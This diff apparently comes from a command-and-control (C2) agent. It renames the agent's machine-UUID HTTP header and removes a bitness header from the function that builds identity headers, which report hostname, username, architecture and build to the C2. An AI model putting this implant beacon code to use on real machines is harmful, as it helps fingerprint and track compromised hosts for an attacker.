@@ -13,7 +13,7 @@
  * @details Identity travels as HTTP headers. The relay
  * copies these headers into its agent events and /status; the C2 consumes them as
  * typed fields without parsing anything binary. Two formats must stay stable:
- *  - X-Agent-Uuid: the machine UUID's 16 bytes formatted as C# Guid.ToString()
+ *  - X-Agent-Machine-Uuid: the machine UUID's 16 bytes formatted as C# Guid.ToString()
  *    (Data1-3 little-endian/reversed, Data4-5 raw) — identical to what the C2 has
  *    historically keyed agents on, so machines registered by older builds keep
  *    their identity.
@@ -78,7 +78,7 @@ static USIZE BuildIdentityHeaders(const SystemInfo &info, Span<CHAR> out)
 
     BOOL ok = true;
     ok = ok && append("X-Agent-Api-Version: ") && appendNum(AGENT_API_VERSION) && append("\r\n");
-    ok = ok && append("X-Agent-Uuid: ") && append(uuid) && append("\r\n");
+    ok = ok && append("X-Agent-Machine-Uuid: ") && append(uuid) && append("\r\n");
     ok = ok && append("X-Agent-Hostname: ") && append(info.Hostname) && append("\r\n");
     ok = ok && append("X-Agent-Username: ") && append(info.Username) && append("\r\n");
     ok = ok && append("X-Agent-Arch: ") && append(info.Architecture) && append("\r\n");
@@ -88,7 +88,9 @@ static USIZE BuildIdentityHeaders(const SystemInfo &info, Span<CHAR> out)
     ok = ok && append("X-Agent-Build: ") && appendNum(AGENT_BUILD_NUMBER) && append("\r\n");
     ok = ok && append("X-Agent-Commit: ") && append(AGENT_COMMIT_HASH) && append("\r\n");
     ok = ok && append("X-Agent-Name-Id: ") && appendNum(AGENT_NAME_ID) && append("\r\n");
-    ok = ok && append("X-Agent-Bitness: ") && appendNum(sizeof(void *) * 8) && append("\r\n");
+    // No X-Agent-Bitness header: the process arch header already carries the full
+    // width, and x86_64/aarch64 are both 64-bit — a bare bit flag says nothing about
+    // which.
     ok = ok && append("X-Agent-Capabilities: ");
     for (USIZE i = 0; ok && i < CAPABILITY_MASK_BYTES; i++)
     {
